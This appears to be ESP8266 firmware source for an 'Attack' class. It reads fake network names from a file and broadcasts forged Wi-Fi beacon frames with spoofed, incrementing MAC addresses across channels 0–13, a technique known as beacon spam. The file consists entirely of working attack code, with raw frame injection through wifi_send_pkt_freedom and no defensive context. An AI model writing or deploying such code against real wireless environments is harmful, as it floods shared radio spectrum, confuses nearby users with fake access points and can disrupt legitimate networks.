#include <attack.h>

extern "C"
{
#include "user_interface.h"
}

Attack::Attack()
{
}

bool Attack::loadSSIDs(const char *filename)
{
    ssids.clear();
    File ssidFile = LittleFS.open(filename, "r");
    if (!ssidFile)
    {
        Serial.printf("\n %s file not available", filename);
        return false;
    }
    while (ssidFile.available())
    {
        String ssid = ssidFile.readStringUntil('\n');
        ssid.trim();
        if (ssid.length() > 0 && ssid.length() < 32)
        {
            ssids.push_back(ssid);
        }
    }
    ssidFile.close();
    return true;
}

void Attack::startBeacon()
{
    if (ssids.empty())
    {
        Serial.println("Custom SSID's Not Filled");
    }

    beacon.active = true;
    Serial.println("Beacon Starting!");

    while (beacon.active)
    {
        for (int ch = 0; ch <= 13; ch++)
        {
            wifi_set_channel(ch);
            beaconPacket[82] = ch;
            for (const String &ssid : ssids)
            {
                if (!beacon.active)
                    break;
                memcpy(&beaconPacket[10], mac, 6);
                memcpy(&beaconPacket[16], mac, 6);

                int ssidLen = ssid.length();
                beaconPacket[37] = ssidLen;
                memcpy(&beaconPacket[38], ssid.c_str(), ssidLen);

                if (ssidLen < 32)
                {
                    memset(&beaconPacket[38 + ssidLen], ' ', 32 - ssidLen);
                }

                wifi_send_pkt_freedom(beaconPacket, sizeof(beaconPacket), 0);
                wifi_send_pkt_freedom(beaconPacket, sizeof(beaconPacket), 0);
                mac[5]++;
                if (mac[5] > 0xFE)
                    mac[4]++;
                beacon.packetCounter++;
                delay(2);
            }
            if (!beacon.active)
                break;
            delay(1);
        }
    }
}

void Attack::stopBeacon()
{
    beacon.active = false;
    Serial.printf("\n Beacon Spam Stopped. Total Pkts Sent %d \n", beacon.packetCounter);
    beacon.packetCounter = 0;
}